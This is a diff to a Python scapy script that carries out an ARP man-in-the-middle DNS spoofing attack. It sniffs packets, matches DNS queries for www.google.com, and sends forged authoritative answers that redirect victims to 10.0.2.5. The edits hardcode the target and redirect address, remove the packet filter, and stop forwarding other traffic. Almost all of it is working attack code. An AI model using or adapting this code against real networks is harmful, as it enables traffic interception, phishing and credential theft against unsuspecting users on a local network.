@@ -5,8 +5,6 @@ import sys, time, multiprocessing
 # Constants
 DIVIDER = '=' * 60
 POISON_BREAK = 30
-SPOOF_DOMAIN_NAME = 'www.google.com'
-REDIRECT_IP = '93.184.216.34'
 
 # ARP Man in the Middle DNS Spoofing Attack
 class ARPMITMDNSSpoofing():
@@ -76,20 +74,17 @@ class ARPMITMDNSSpoofing():
 
     # Sniffs incoming packets
     def sniffIncomingPackets(self):
-        bpfFilter = '(not ip host 10.0.2.4) and not arp and not ip host 127.0.0.1'
-        incomingPackets = scapy.sniff(filter = bpfFilter, prn = self.dnsSpoof)
+        incomingPackets = scapy.sniff(prn = self.dnsSpoof)
 
     # DNS spoof packets
     def dnsSpoof(self, packet):
-        print(packet.summary())
         if (packet.haslayer(scapy.DNS)):
-            # Initialize packet layers
+            # Retrieve packet info        
             packetDNSLayer = packet.getlayer(scapy.DNS)
-            isRightDomain = packetDNSLayer.qd.qname == SPOOF_DOMAIN_NAME + '.'
-            isDNSRequest = packetDNSLayer.qr == 0
-            #print(packetDNSLayer.qd.qname)
-            if isDNSRequest and isRightDomain:
-                print("The spoofed domain ({}) was requested".format(SPOOF_DOMAIN_NAME))
+            isRightDomain = packetDNSLayer.qd.qname == 'www.google.com.'
+            # isDNSRequest = packetDNSLayer.qr == 0
+
+            if isRightDomain:
                 # Original packet layers
                 packetIPLayer = packet.getlayer(scapy.IP)
                 packetUDPLayer = packet.getlayer(scapy.UDP)
@@ -103,15 +98,13 @@ class ARPMITMDNSSpoofing():
                                 qr = 1,
                                 aa = 1,
                                 qd = packetDNSLayer.qd,
-                                an = scapy.DNSRR(rrname = packetDNSLayer.qd.qname,
+                                an = scapy.DNSRR(rrname = 'www.google.com.',
                                                 ttl = 10,
-                                                rdata = REDIRECT_IP))
+                                                rdata = '10.0.2.5'))
 
                 packet = spoofedIPLayer/spoofedUDPLayer/spoofedDNSLayer # Assemble and assign spoofed packet
+
                 scapy.send(packet)
-            else:
-                scapy.sendp(packet)
-        scapy.sendp(packet)
 
     # Clean ARP tables of the victims
     def clean(self):
